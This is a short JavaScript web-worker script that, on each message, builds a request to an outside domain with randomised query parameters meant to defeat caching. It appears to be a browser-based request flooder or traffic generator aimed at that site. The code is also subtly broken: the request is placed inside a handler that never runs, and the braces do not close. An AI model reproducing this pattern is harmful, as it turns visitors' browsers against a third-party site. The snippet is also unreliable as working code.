self.addEventListener('message', function(e) {
	var url = 'http://saunaetkiliatlet.com/?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.onreadystatechange = function() { 
	xmlHttp.open("GET", url, true);
	xmlHttp.send(null);
});
